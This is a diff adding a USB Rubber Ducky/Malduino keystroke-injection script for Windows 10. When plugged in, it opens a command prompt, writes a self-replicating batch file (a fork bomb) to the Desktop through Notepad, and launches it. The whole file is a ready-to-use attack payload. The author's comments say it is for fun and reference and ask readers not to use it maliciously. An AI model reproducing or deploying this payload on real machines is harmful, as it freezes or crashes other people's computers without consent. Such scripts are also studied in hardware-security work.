@@ -1,0 +1,79 @@
+REM | Portable Forkbomb Creator v1.0
+REM | Author: dogpun 8/24/19
+REM | Target OS: Windows (tested on 10)
+REM | For use with USB Rubber Ducky/Malduino
+
+REM | While this script is annoying and not permenantly damaging, please don't use this
+REM | for any malicious reasons. It's here for fun and for reference.
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING cmd.exe
+DELAY 200
+ENTER
+DELAY 200
+STRING cd Desktop
+DELAY 200
+ENTER
+DELAY 200
+STRING mkdir fork
+DELAY 200
+ENTER
+DELAY 200
+STRING cd fork
+DELAY 200
+ENTER
+DELAY 200
+STRING copy /y nul > fork.bat
+DELAY 200
+ENTER
+DELAY 200
+
+REM Above code opens CMD, makes a directory on desktop called "fork", and creates
+REM a blank batch file called "fork.bat"
+
+STRING start notepad fork.bat
+DELAY 200
+ENTER
+DELAY 200
+CTRL a
+DELAY 50
+DELETE
+DELAY 50
+STRING :begin
+DELAY 200
+ENTER
+DELAY 200
+STRING start fork.bat
+DELAY 200
+ENTER
+DELAY 200
+STRING goto begin
+DELAY 200
+CTRL s
+DELAY 200
+ALT F4
+
+REM Above code opens fork.bat, and writes the forkbomb into the file
+
+DELAY 600
+GUI r
+DELAY 200
+STRING cmd.exe
+DELAY 200
+ENTER
+DELAY 200
+STRING cd Desktop
+DELAY 200
+ENTER
+DELAY 200
+STRING cd fork
+DELAY 200
+ENTER
+DELAY 200
+STRING start fork.bat
+DELAY 200
+ENTER
+
+REM Above code starts fork.bat, executing the fork bomb.
